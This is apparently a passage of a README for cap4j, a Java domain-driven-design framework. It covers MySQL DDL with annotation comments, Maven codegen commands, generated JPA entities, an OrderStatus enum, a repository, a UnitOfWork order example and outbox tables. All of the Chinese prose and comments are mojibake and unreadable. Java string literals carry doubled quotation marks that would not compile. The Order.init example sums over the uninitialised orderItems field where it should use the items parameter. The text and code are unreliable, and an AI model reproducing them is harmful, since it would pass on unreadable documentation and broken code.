CREATE TABLE `order_item` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `order_id` bigint NOT NULL DEFAULT '0' COMMENT 'å…³è”ä¸»è®¢å•',
  `name` varchar(100) NOT NULL DEFAULT '' COMMENT 'åç§°',
  `price` decimal(14,2) NOT NULL DEFAULT '0.00' COMMENT 'å•ä»·',
  `count` int NOT NULL DEFAULT '0' COMMENT 'æ•°é‡',
  `version` bigint unsigned NOT NULL DEFAULT '0',
  `db_created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'åˆ›å»ºæ—¶é—´',
  `db_updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT 'æ›´æ–°æ—¶é—´',
  `db_deleted` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_db_created_at` (`db_created_at`),
  KEY `idx_db_updated_at` (`db_updated_at`)
) COMMENT='è®¢å•é¡¹\n @P=order';
# ä»¥ä¸Šsqlè¯­å¥éšå«äº†å¦‚ä¸‹å®ä½“æ˜ å°„å…³ç³»ï¼š
# è®¢å•è¡¨(order)å¯¹åº”å®ä½“æ˜¯ä¸€ä¸ªèšåˆæ ¹ï¼Œå¹¶ä¸”è®¢å•é¡¹è¡¨(order_item)å¯¹åº”å®ä½“æ˜¯orderèšåˆçš„å®ä½“æˆå‘˜ã€‚
# è®¢å•è¡¨(order)çš„è®¢å•çŠ¶æ€å­—æ®µ(order_status)å°†ä¼šæ˜ å°„æˆOrderStatusçš„Javaç±»å‹ï¼Œè¯¥OrderStatusæ˜¯ä¸€ä¸ªenumç±»å‹ï¼Œæœ‰3ä¸ªå­—æ®µæˆå‘˜ï¼ŒINITã€PAIDã€CLOSED
```
é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰æ•°æ®åº“è¡¨éƒ½å°†ä¼šæ˜ å°„æˆä¸€ä¸ªJavaå®ä½“ç±»ï¼Œè¯¥å®ä½“ç±»å°†æ„æˆä¸€ä¸ªèšåˆï¼Œå¹¶ä¸”ä½œä¸ºè¯¥èšåˆçš„èšåˆæ ¹ã€‚å¦‚æœèšåˆå­˜åœ¨å…¶ä»–å®ä½“ï¼Œåˆ™å…¶ä»–å®ä½“å¯¹åº”çš„è¡¨æ³¨é‡Šæ ‡æ³¨@Pæ³¨è§£å³å¯ã€‚

> @PæŒ‡ç¤ºè¯¥è¡¨å¯¹åº”çš„Javaå®ä½“ç±»å±äºæŸä¸ªèšåˆå†…çš„å®ä½“æˆå‘˜ã€‚
> 
> @Eè´Ÿè´£ç”ŸæˆOrderStatusæšä¸¾ã€‚@Eéœ€è¦é…åˆ@Tæ‰èƒ½å®Œæˆæ•°æ®åº“å­—æ®µçš„Javaæšä¸¾æ˜ å°„ã€‚
> 
> @Tè´Ÿè´£å°†Orderå®ä½“çš„orderStatuså­—æ®µæ˜ å°„æˆOrderStatusæšä¸¾ï¼Œ@Tå¯ä»¥å•ç‹¬å·¥ä½œï¼Œç”¨äºDBç±»å‹<->Javaç±»å‹çš„å¼ºåˆ¶è‡ªå®šä¹‰æ˜ å°„ã€‚
> 
> å¦‚æœæƒ³è¦å¯¹è¿™å¥—è¯­æ³•æœ‰ä¸ªè¯¦ç»†å®Œæ•´çš„äº†è§£ï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹mavenæŒ‡ä»¤è·å–è¯­æ³•å¸®åŠ©ã€‚
> ```shell
> mvn io.github.netcorepal:cap4j-ddd-codegen-maven-plugin:1.0.0-alpha-1:help
> # or
> mvn cap4j-ddd-codegen:help
> ```
> éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“å‰`cap4j-ddd-codegen:gen-entity`ä»…æ”¯æŒåŸºäºMySQLæ•°æ®åº“æ³¨é‡Šçš„æ³¨è§£è§£æã€‚

å…ˆåæ‰§è¡Œ
```shell
mvn cap4j-ddd-codegen:gen-entity
mvn cap4j-ddd-codegen:gen-repository
```
ä»£ç ç”Ÿæˆç»“æœ
```java
package org.netcorepal.cap4j.ddd.example.domain.aggregates;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Getter;
import lombok.NoArgsConstructor;
import org.hibernate.annotations.GenericGenerator;
import org.hibernate.annotations.DynamicInsert;
import org.hibernate.annotations.DynamicUpdate;
import org.hibernate.annotations.Fetch;
import org.hibernate.annotations.FetchMode;
import org.hibernate.annotations.SQLDelete;
import org.hibernate.annotations.Where;

import javax.persistence.*;

/**
 * è®¢å•
 *
 * æœ¬æ–‡ä»¶ç”±[cap4j-ddd-codegen-maven-plugin]ç”Ÿæˆ
 * è­¦å‘Šï¼šè¯·å‹¿æ‰‹å·¥ä¿®æ”¹è¯¥æ–‡ä»¶çš„å­—æ®µå£°æ˜ï¼Œé‡æ–°ç”Ÿæˆä¼šè¦†ç›–å­—æ®µå£°æ˜
 */
/* @AggregateRoot */
@Entity
@Table(name = ""`order`"")
@DynamicInsert
@DynamicUpdate
@SQLDelete(sql = ""update `order` set `db_deleted` = 1 where id = ? and `version` = ? "")
@Where(clause = ""`db_deleted` = 0"")

@AllArgsConstructor
@NoArgsConstructor
@Builder
@Getter
public class Order {

    // ã€è¡Œä¸ºæ–¹æ³•å¼€å§‹ã€‘



    // ã€è¡Œä¸ºæ–¹æ³•ç»“æŸã€‘



    // ã€å­—æ®µæ˜ å°„å¼€å§‹ã€‘æœ¬æ®µè½ç”±[cap4j-ddd-codegen-maven-plugin]ç»´æŠ¤ï¼Œè¯·ä¸è¦æ‰‹å·¥æ”¹åŠ¨

    @Id
    @GeneratedValue(generator = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"")
    @GenericGenerator(name = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"", strategy = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"")
    @Column(name = ""`id`"")
    Long id;


    /**
     * è®¢å•ç¼–å·
     * varchar(100)
     */
    @Column(name = ""`order_no`"")
    String orderNo;

    /**
     * è®¢å•çŠ¶æ€
     * 0:INIT:å¾…æ”¯ä»˜;-1:CLOSED:å·²å…³é—­;1:PAID:å·²æ”¯ä»˜
     * int unsigned
     */
    @Convert(converter = org.netcorepal.cap4j.ddd.example.domain.aggregates.enums.OrderStatus.Converter.class)
    @Column(name = ""`order_status`"")
    org.netcorepal.cap4j.ddd.example.domain.aggregates.enums.OrderStatus orderStatus;

    /**
     * æ€»é‡‘é¢
     * decimal(14,2)
     */
    @Column(name = ""`amount`"")
    java.math.BigDecimal amount;

    @OneToMany(cascade = { CascadeType.ALL }, fetch = FetchType.EAGER, orphanRemoval = true) @Fetch(FetchMode.SUBSELECT)
    @JoinColumn(name = ""`order_id`"", nullable = false)
    private java.util.List<org.netcorepal.cap4j.ddd.example.domain.aggregates.OrderItem> orderItems;

    /**
     * æ•°æ®ç‰ˆæœ¬ï¼ˆæ”¯æŒä¹è§‚é”ï¼‰
     */
    @Version
    @Column(name = ""`version`"")
    Integer version;

    // ã€å­—æ®µæ˜ å°„ç»“æŸã€‘æœ¬æ®µè½ç”±[cap4j-ddd-codegen-maven-plugin]ç»´æŠ¤ï¼Œè¯·ä¸è¦æ‰‹å·¥æ”¹åŠ¨
}

```

```java
package org.netcorepal.cap4j.ddd.example.domain.aggregates;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Getter;
import lombok.NoArgsConstructor;
import org.hibernate.annotations.GenericGenerator;
import org.hibernate.annotations.DynamicInsert;
import org.hibernate.annotations.DynamicUpdate;
import org.hibernate.annotations.Fetch;
import org.hibernate.annotations.FetchMode;
import org.hibernate.annotations.SQLDelete;
import org.hibernate.annotations.Where;

import javax.persistence.*;

/**
 * è®¢å•é¡¹
 *  
 *
 * æœ¬æ–‡ä»¶ç”±[cap4j-ddd-codegen-maven-plugin]ç”Ÿæˆ
 * è­¦å‘Šï¼šè¯·å‹¿æ‰‹å·¥ä¿®æ”¹è¯¥æ–‡ä»¶çš„å­—æ®µå£°æ˜ï¼Œé‡æ–°ç”Ÿæˆä¼šè¦†ç›–å­—æ®µå£°æ˜
 */
@Entity
@Table(name = ""`order_item`"")
@DynamicInsert
@DynamicUpdate
@SQLDelete(sql = ""update `order_item` set `db_deleted` = 1 where id = ? and `version` = ? "")
@Where(clause = ""`db_deleted` = 0"")

@AllArgsConstructor
@NoArgsConstructor
@Builder
@Getter
public class OrderItem {

    // ã€è¡Œä¸ºæ–¹æ³•å¼€å§‹ã€‘



    // ã€è¡Œä¸ºæ–¹æ³•ç»“æŸã€‘



    // ã€å­—æ®µæ˜ å°„å¼€å§‹ã€‘æœ¬æ®µè½ç”±[cap4j-ddd-codegen-maven-plugin]ç»´æŠ¤ï¼Œè¯·ä¸è¦æ‰‹å·¥æ”¹åŠ¨

    @Id
    @GeneratedValue(generator = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"")
    @GenericGenerator(name = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"", strategy = ""org.netcorepal.cap4j.ddd.application.distributed.SnowflakeIdentifierGenerator"")
    @Column(name = ""`id`"")
    Long id;


    /**
     * åç§°
     * varchar(100)
     */
    @Column(name = ""`name`"")
    String name;

    /**
     * å•ä»·
     * decimal(14,2)
     */
    @Column(name = ""`price`"")
    java.math.BigDecimal price;

    /**
     * æ•°é‡
     * int
     */
    @Column(name = ""`count`"")
    Integer count;

    /**
     * æ•°æ®ç‰ˆæœ¬ï¼ˆæ”¯æŒä¹è§‚é”ï¼‰
     */
    @Version
    @Column(name = ""`version`"")
    Integer version;

    // ã€å­—æ®µæ˜ å°„ç»“æŸã€‘æœ¬æ®µè½ç”±[cap4j-ddd-codegen-maven-plugin]ç»´æŠ¤ï¼Œè¯·ä¸è¦æ‰‹å·¥æ”¹åŠ¨
}


```

```java
package org.netcorepal.cap4j.ddd.example.domain.aggregates.enums;

import lombok.Getter;

import javax.persistence.*;
import java.util.HashMap;
import java.util.Map;

/**
 * æœ¬æ–‡ä»¶ç”±[cap4j-ddd-codegen-maven-plugin]ç”Ÿæˆ
 * è­¦å‘Šï¼šè¯·å‹¿æ‰‹å·¥ä¿®æ”¹è¯¥æ–‡ä»¶ï¼Œé‡æ–°ç”Ÿæˆä¼šè¦†ç›–è¯¥æ–‡ä»¶
 */
public enum OrderStatus {

    /**
     * å¾…æ”¯ä»˜
     */
    INIT(0, ""å¾…æ”¯ä»˜""),
    /**
     * å·²å…³é—­
     */
    CLOSED(-1, ""å·²å…³é—­""),
    /**
     * å·²æ”¯ä»˜
     */
    PAID(1, ""å·²æ”¯ä»˜""),
;
    @Getter
    private int code;
    @Getter
    private String name;

    OrderStatus(Integer code, String name){
        this.code = code;
        this.name = name;
    }

    private static Map<Integer, OrderStatus> enums = null;
    public static OrderStatus valueOf(Integer code) {
        if(enums == null) {
            enums = new HashMap<>();
            for (OrderStatus val : OrderStatus.values()) {
                enums.put(val.code, val);
            }
        }
        if(enums.containsKey(code)){
            return enums.get(code);
        }
        throw new RuntimeException(""æšä¸¾ç±»å‹OrderStatusæšä¸¾å€¼è½¬æ¢å¼‚å¸¸ï¼Œä¸å­˜åœ¨çš„å€¼"" + code);
    }

    /**
     * JPAè½¬æ¢å™¨
     */
    public static class Converter implements AttributeConverter<OrderStatus, Integer>{
        @Override
        public Integer convertToDatabaseColumn(OrderStatus  val) {
            return val.code;
        }

        @Override
        public OrderStatus convertToEntityAttribute(Integer code) {
            return OrderStatus.valueOf(code);
        }
    }
}


```

```java
package org.netcorepal.cap4j.ddd.example.adapter.domain.repositories;

import org.netcorepal.cap4j.ddd.example.domain.aggregates.Order;

/**
 * æœ¬æ–‡ä»¶ç”±[cap4j-ddd-codegen-maven-plugin]ç”Ÿæˆ
 */
public interface OrderRepository extends org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository<Order, Long> {
    // ã€è‡ªå®šä¹‰ä»£ç å¼€å§‹ã€‘æœ¬æ®µè½ä¹‹å¤–ä»£ç ç”±[cap4j-ddd-codegen-maven-plugin]ç»´æŠ¤ï¼Œè¯·ä¸è¦æ‰‹å·¥æ”¹åŠ¨

    @org.springframework.stereotype.Component
    public static class OrderJpaRepositoryAdapter extends org.netcorepal.cap4j.ddd.domain.repo.AbstractJpaRepository<Order, Long>
    {
        public OrderJpaRepositoryAdapter(org.springframework.data.jpa.repository.JpaSpecificationExecutor<Order> jpaSpecificationExecutor, org.springframework.data.jpa.repository.JpaRepository<Order, Long> jpaRepository) {
            super(jpaSpecificationExecutor, jpaRepository);
        }
    }

    // ã€è‡ªå®šä¹‰ä»£ç ç»“æŸã€‘æœ¬æ®µè½ä¹‹å¤–ä»£ç ç”±[cap4j-ddd-codegen-maven-plugin]ç»´æŠ¤ï¼Œè¯·ä¸è¦æ‰‹å·¥æ”¹åŠ¨
}

```

##### UniOfWorkæ¨¡å¼
ç®€å•æ¥è¯´[UoW](https://learn.microsoft.com/en-us/archive/msdn-magazine/2009/june/the-unit-of-work-pattern-and-persistence-ignorance)å®ç°äº†å°†å½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰å®ä½“çš„å˜æ›´æ“ä½œä¸€å¹¶è½¬åŒ–æˆå¯¹åº”çš„å…³ç³»å‹æ•°æ®åº“çš„æŒä¹…åŒ–DMLï¼ˆinsertã€updateã€deleteï¼‰çš„èƒ½åŠ›ã€‚ç¼©çŸ­äº‹åŠ¡æ‰§è¡Œæ—¶é—´çš„åŒæ—¶ï¼Œå¯ä»¥è®©æˆ‘ä»¬å°†æ›´å¤šçš„ç²¾åŠ›æ”¾åœ¨ä¸šåŠ¡é€»è¾‘å®ç°å’Œä¼˜åŒ–ä¸Šã€‚

UnitOfWork å¸¸ç”¨æ¥å£
- `persist(Object entity)` å¾…æŒä¹…åŒ–æ·»åŠ æˆ–æ›´æ–°
- `remove(Object entity)` å¾…æŒä¹…åŒ–åˆ é™¤
- `save()` ä»¥æ•´ä½“äº‹åŠ¡æäº¤ä»¥ä¸Šå¾…æŒä¹…åŒ–çš„å˜æ›´(æ·»åŠ ã€æ›´æ–°æˆ–åˆ é™¤)

ç¤ºä¾‹
```java
// ä»£ç çœç•¥...
public class Order {

    // ã€è¡Œä¸ºæ–¹æ³•å¼€å§‹ã€‘

    /**
     * ä¸‹å•åˆå§‹åŒ–
     * @param items
     */
    public void init(List<OrderItem> items){
        this.orderNo = ""order-"" + System.currentTimeMillis();
        this.orderStatus = OrderStatus.INIT;
        BigDecimal amount = orderItems.stream()
                .map(i -> i.getPrice().multiply(BigDecimal.valueOf( i.getCount())))
                .reduce(BigDecimal.ZERO, (a,b) -> a.add(b));
        this.amount = amount;
        this.orderItems = items;
    }

    // ã€è¡Œä¸ºæ–¹æ³•ç»“æŸã€‘
    // ä»£ç çœç•¥...
}
```

```java
package org.netcorepal.cap4j.ddd.example.application.commands;

import io.swagger.v3.oas.annotations.media.Schema;
import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.netcorepal.cap4j.ddd.application.command.Command;
import org.netcorepal.cap4j.ddd.domain.repo.AggregateRepository;
import org.netcorepal.cap4j.ddd.domain.repo.UnitOfWork;
import org.netcorepal.cap4j.ddd.example.domain.aggregates.Order;
import org.netcorepal.cap4j.ddd.example.domain.aggregates.OrderItem;
import org.springframework.stereotype.Service;

import java.math.BigDecimal;
import java.util.List;
import java.util.stream.Collectors;


/**
 * ä¸‹å•
 *
 * @date 2024/8/21
 */
@Data
@Builder
@NoArgsConstructor
@AllArgsConstructor
public class PlaceOrderCmd {

    @Schema(description = ""è®¢å•é¡¹åˆ—è¡¨"")
    List<Item> orderItems;


    @Schema(description = ""è®¢å•é¡¹"")
    public static class Item{

        @Schema(description = ""åç§°"")
        String name;

        @Schema(description = ""ä»·æ ¼"")
        BigDecimal price;

        @Schema(description = ""æ•°é‡"")
        Integer count;
    }

    @Service
    @RequiredArgsConstructor
    @Slf4j
    public static class Handler implements Command<PlaceOrderCmd, String> {
        private final AggregateRepository<Order, Long> repo;
        private final UnitOfWork unitOfWork;

        @Override
        public String exec(PlaceOrderCmd cmd) {

            Order order = Order.builder().build();

            List<OrderItem> orderItems = cmd.orderItems.stream()
                    .map(i -> OrderItem.builder()
                            .name(i.name)
                            .price(i.price)
                            .count(i.count)
                            .build())
                    .collect(Collectors.toList());

            order.init(orderItems);

            unitOfWork.persist(order);
            unitOfWork.save();

            return order.getOrderNo();
        }
    }
}
```

##### äº‹ä»¶å®šä¹‰ã€è®¢é˜…ã€å‘å¸ƒ
**åˆ›å»ºå‘ä»¶ç®±è¡¨**

ä¸ºäº†å®ç°`Outbox`æ¨¡å¼ï¼Œcap4jéœ€è¦åœ¨ä¸šåŠ¡åº“ä¸­åˆ›å»ºå‘ä»¶ç®±è¡¨ã€‚è„šæ‰‹æ¶åˆå§‹åŒ–åï¼Œé¡¹ç›®å†…`resources/ddl.sql`åŒ…å«å®Œæ•´çš„å‘ä»¶ç®±è¡¨å»ºè¡¨è¯­å¥
```sql
-- Create syntax for TABLE '__event'
CREATE TABLE `__event` (
                           `id` bigint(20) NOT NULL AUTO_INCREMENT,
                           `event_uuid` varchar(64) NOT NULL DEFAULT '' COMMENT 'äº‹ä»¶uuid',
                           `svc_name` varchar(255) NOT NULL DEFAULT '' COMMENT 'æœåŠ¡',
                           `event_type` varchar(255) NOT NULL DEFAULT '' COMMENT 'äº‹ä»¶ç±»å‹',
                           `data` text COMMENT 'äº‹ä»¶æ•°æ®',
                           `data_type` varchar(255) NOT NULL DEFAULT '' COMMENT 'äº‹ä»¶æ•°æ®ç±»å‹',
                           `exception` text COMMENT 'äº‹ä»¶å‘é€å¼‚å¸¸',
                           `expire_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'è¿‡æœŸæ—¶é—´',
                           `create_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'åˆ›å»ºæ—¶é—´',
                           `event_state` int(11) NOT NULL DEFAULT '0' COMMENT 'åˆ†å‘çŠ¶æ€',
                           `last_try_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'ä¸Šæ¬¡å°è¯•æ—¶é—´',
                           `next_try_time` datetime NOT NULL DEFAULT '0001-01-01 00:00:00' COMMENT 'ä¸‹æ¬¡å°è¯•æ—¶é—´',
                           `tried_times` int(11) NOT NULL DEFAULT '0' COMMENT 'å·²å°è¯•æ¬¡æ•°',
                           `try_times` int(11) NOT NULL DEFAULT '0' COMMENT 'å°è¯•æ¬¡æ•°',
                           `version` int(11) NOT NULL DEFAULT '0',
                           `db_created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'åˆ›å»ºæ—¶é—´',
                           `db_updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT 'æ›´æ–°æ—¶é—´',
                           PRIMARY KEY (`id`
#   , `db_created_at`
                               ),
                           KEY `idx_db_created_at` (`db_created_at`),
                           KEY `idx_db_updated_at` (`db_updated_at`),
                           KEY `idx_event_uuid` (`event_uuid`),
                           KEY `idx_event_type` (`event_type`,`svc_name`),
                           KEY `idx_create_at` (`create_at`),
                           KEY `idx_expire_at` (`expire_at`),
                           KEY `idx_next_try_time` (`next_try_time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='äº‹ä»¶å‘ä»¶ç®± support by cap4j\n@I;'
# partition by range(to_days(db_created_at))
# (partition p202201 values less than (to_days('2022-02-01')) ENGINE=InnoDB)
;
-- Create syntax for TABLE '__achrived_event'
CREATE TABLE `__achrived_event` (
                           `id` bigint(20) NOT NULL AUTO_INCREMENT,
                           `event_uuid` varchar(64) NOT NULL DEFAULT '' COMMENT 'äº‹ä»¶uuid',
                           `svc_name` varchar(255) NOT NULL DEFAULT '' COMMENT 'æœåŠ¡',
                           `event_type` varchar(255) NOT NULL DEFAULT '' COMMENT 'äº‹ä»¶ç±»å‹',
                           `data` text COMMENT 'äº‹ä»¶æ•°æ®',
                           `data_type` varchar(255) NOT NULL DEFAULT '' COMMENT 'äº‹ä»¶æ•°æ®ç±»å‹',
                           `exception` text COMMENT 'äº‹ä»¶å‘é€å¼‚å¸¸',
                           `expire_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'è¿‡æœŸæ—¶é—´',
                           `create_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'åˆ›å»ºæ—¶é—´',
                           `event_state` int(11) NOT NULL DEFAULT '0' COMMENT 'åˆ†å‘çŠ¶æ€',
                           `last_try_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'ä¸Šæ¬¡å°è¯•æ—¶é—´',
                           `next_try_time` datetime NOT NULL DEFAULT '0001-01-01 00:00:00' COMMENT 'ä¸‹æ¬¡å°è¯•æ—¶é—´',
                           `tried_times` int(11) NOT NULL DEFAULT '0' COMMENT 'å·²å°è¯•æ¬¡æ•°',
                           `try_times` int(11) NOT NULL DEFAULT '0' COMMENT 'å°è¯•æ¬¡æ•°',
                           `version` int(11) NOT NULL DEFAULT '0',
                           `db_created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'åˆ›å»ºæ—¶é—´',
                           `db_updated_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT 'æ›´æ–°æ—¶é—´',
                           PRIMARY KEY (`id`
#   , `db_created_at`
                               ),
                           KEY `idx_db_created_at` (`db_created_at`),
                           KEY `idx_db_updated_at` (`db_updated_at`),
                           KEY `idx_event_uuid` (`event_uuid`),
                           KEY `idx_event_type` (`event_type`,`svc_name`),
                           KEY `idx_create_at` (`create_at`),
                           KEY `idx_expire_at` (`expire_at`),
                           KEY `idx_next_try_time` (`next_try_time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='äº‹ä»¶å‘ä»¶ç®±å­˜æ¡£ support by cap4j\n@I;'
# partition by range(to_days(db_created_at))
# (partition p202201 values less than (to_days('2022-02-01')) ENGINE=InnoDB)
;

CREATE TABLE `__locker` (
                            `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
                            `name` varchar(100) NOT NULL DEFAULT '' COMMENT 'é”åç§°',
                            `pwd` varchar(100) NOT NULL DEFAULT '' COMMENT 'é”å¯†ç ',
                            `lock_at` datetime NOT NULL DEFAULT '1970-01-01 00:00:00' COMMENT 'é”è·å–æ—¶é—´',
                            `unlock_at` datetime NOT NULL DEFAULT '1970-01-01 00:00:00' COMMENT 'é”é‡Šæ”¾æ—¶é—´',
                            `version` bigint(20) unsigned NOT NULL DEFAULT '0',
                            `db_created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT 'åˆ›å»ºæ—¶é—´',
                            `db_updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP  COMMENT 'æ›´æ–°æ—¶é—´',
                            PRIMARY KEY (`id`),
                            KEY `idx_db_created_at` (`db_created_at`),
                            KEY `idx_db_updated_at` (`db_updated_at`),
                            UNIQUE `uniq_name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='é” support by cap4j\n@I;';

```

**é¢†åŸŸäº‹ä»¶å®šä¹‰**

é€šå¸¸é¢†åŸŸäº‹ä»¶å‘å¸ƒéœ€é…åˆ`UnitOfWork`æ¨¡å¼å®ç°ï¼Œè¿™æŒ‡çš„æ˜¯é¢†åŸŸäº‹ä»¶çš„å‘å¸ƒä¸èšåˆå†…å®ä½“å±æ€§çŠ¶æ€å˜æ›´çš„æŒä¹…åŒ–æ˜¯æ†ç»‘çš„ï¼ˆå½’å±åŒä¸€äº‹åŠ¡ï¼‰ï¼Œæ‰€ä»¥æ›´åˆç†çš„åšæ³•æ˜¯é¢†åŸŸäº‹ä»¶ä¸€èˆ¬å®šä¹‰åœ¨é¢†åŸŸå±‚ï¼ˆ`domain`)ã€‚

é€šè¿‡[`DomainEvent`](ddd-core/src/main/java/org/netcorepal/cap4j/ddd/domain/event/annotation/DomainEvent.java)æ³¨è§£çš„ç±»ï¼Œcap4jå°†ä¼šè¯†åˆ«æˆé¢†åŸŸäº‹ä»¶ã€‚
åç»­å³å¯é€šè¿‡[`DefaultDomainEventSupervisor`](ddd-core/src/main/java/org/netcorepal/cap4j/ddd/domain/event/impl/DefaultDomainEventSupervisor.java).`instance`.`attach`æ–¹æ³•æ¥å‘å½“å‰çº¿ç¨‹ä¸Šçº¿æ–‡é™„åŠ é¢†åŸŸäº‹ä»¶ã€‚
ä¸€æ—¦ [`UnitOfWork`](ddd-core/src/main/java/org/netcorepal/cap4j/ddd/domain/repo/UnitOfWork.java).save() é¡ºåˆ©æäº¤äº‹åŠ¡ã€‚åˆ™cap4jå°†ä¼šä¿éšœäº‹ä»¶è¢«æäº¤åˆ°å…·ä½“é€‚é…å¥½çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆæ¯”å¦‚å½“å‰cap4jå®ç°çš„RocketMQï¼‰ä¸­ã€‚

```java
package org.netcorepal.cap4j.ddd.example.domain.aggregates.events;

import lombok.AllArgsConstructor;
import lombok.Builder;
import lombok.Data;
import lombok.NoArgsConstructor;
import org.netcorepal.cap4j.ddd.domain.event.annotation.DomainEvent;

import java.math.BigDecimal;
import java.time.LocalDateTime;

/**
 * ä¸‹å•é¢†åŸŸäº‹ä»¶
 *
 * @author bingking338
 */
@DomainEvent(
        persist = true
)
@Data
@AllArgsConstructor
@NoArgsConstructor
@Builder
public class OrderPlacedDomainEvent {
    /**
     * è®¢å•å·
     */
    String orderNo;
    /**
     * è®¢å•é‡‘é¢
     */
    BigDecimal amount;
    /**
     * ä¸‹å•æ—¶é—´
     */
    LocalDateTime orderTime;
}

```
> æ³¨è§£å±æ€§è¯¦è§£
> - `value()` valueå­—æ®µéç©ºï¼Œåˆ™äº‹ä»¶ä¼šè¢«è¯†åˆ«ä¸ºé›†æˆäº‹ä»¶ï¼Œæ„å‘³ç€è¯¥äº‹ä»¶å°†é€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—é€‚é…ï¼Œé€šçŸ¥åˆ°åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„å…¶ä»–æœåŠ¡è¿›ç¨‹ã€‚
> - `subscriber()` é›†æˆäº‹ä»¶è®¢é˜…åœºæ™¯ï¼Œå¿…é¡»å®šä¹‰è¯¥å­—æ®µï¼Œé€šå¸¸è¯¥å­—æ®µçš„å€¼å°†ä¼šè¢«é€‚é…çš„æ¶ˆæ¯é˜Ÿåˆ—åº”ç”¨åˆ°æ¶ˆè´¹åˆ†ç»„é…ç½®ä¸­ã€‚
> - `persist()` æ§åˆ¶äº‹ä»¶å‘å¸ƒè®°å½•æŒä¹…åŒ–ã€‚é›†æˆäº‹ä»¶å‘å¸ƒåœºæ™¯ï¼Œè¯¥å­—æ®µæ— æ„ä¹‰ã€‚éé›†æˆäº‹ä»¶å‘å¸ƒåœºæ™¯ï¼ˆä»…åœ¨æœ¬æœåŠ¡è¿›ç¨‹å†…éƒ¨æœ‰è®¢é˜…éœ€æ±‚ï¼‰ï¼Œå¯ä»¥é€šè¿‡`persist=true`æ§åˆ¶äº‹ä»¶è¿›å…¥å‘ä»¶ç®±è¡¨ï¼Œå¹¶è„±ç¦»äº‹ä»¶å‘å¸ƒä¸Šä¸‹æ–‡äº‹åŠ¡ä¸­ã€‚ä»¥é¿å…è®¢é˜…é€»è¾‘å¼‚å¸¸å½±å“å‘å¸ƒäº‹åŠ¡çš„å®Œæˆã€‚
> 
> åº”ç”¨åœºæ™¯ä¾‹å­è¯´æ˜
> - `åŸºäºMQå‘é€æ–¹` DomainEvent(value=""event-name-used-for-mq-topic"")
> - `åŸºäºMQè®¢é˜…æ–¹` DomainEvent(subscriber=""consumer-group"")
> - `æ¶ˆè´¹æ–¹ä¸è®¢é˜…æ–¹äº‹åŠ¡éš”ç¦»` DomainEvent(persist=true)
> - `æ¶ˆè´¹æ–¹ä¸è®¢é˜…æ–¹åŒä¸€äº‹åŠ¡` DomainEvent
> 
> å…³äºé¢†åŸŸäº‹ä»¶ä¸é›†æˆäº‹ä»¶
> 
> é›†æˆäº‹ä»¶æŒ‡ä¼šå¯¹ç³»ç»Ÿå†…å…¶ä»–æœåŠ¡å‘å¸ƒçš„é¢†åŸŸäº‹ä»¶ã€‚é€šå¸¸å¦‚æœè¦åŒºåˆ†é¢†åŸŸäº‹ä»¶å’Œé›†æˆäº‹ä»¶ï¼Œé‚£ä¹ˆé¢†åŸŸäº‹ä»¶ä¸€èˆ¬æŒ‡çš„æ˜¯ä¸éœ€è¦å¯¹å¤–å‘å¸ƒçš„ä¸šåŠ¡äº‹ä»¶ï¼Œä»…åœ¨å†…éƒ¨èšåˆä¹‹é—´åº”ç”¨ã€‚å¾ˆå¤šåœ°æ–¹éƒ½ä¸åŒºåˆ†é¢†åŸŸäº‹ä»¶ä¸é›†æˆäº‹ä»¶ï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºè¿™ä¸ªåŒºåˆ†æ˜¯ä»·å€¼çš„ã€‚
>


**é¢†åŸŸäº‹ä»¶å‘å¸ƒ**

é€šå¸¸åº”åœ¨å®ä½“è¡Œä¸ºä¸­ï¼Œå‘å¸ƒé¢†åŸŸäº‹ä»¶ã€‚

æ¥å£[DomainEventSupervisor.java](ddd-core/src/main/java/org/netcorepal/cap4j/ddd/domain/event/DomainEventSupervisor.java)
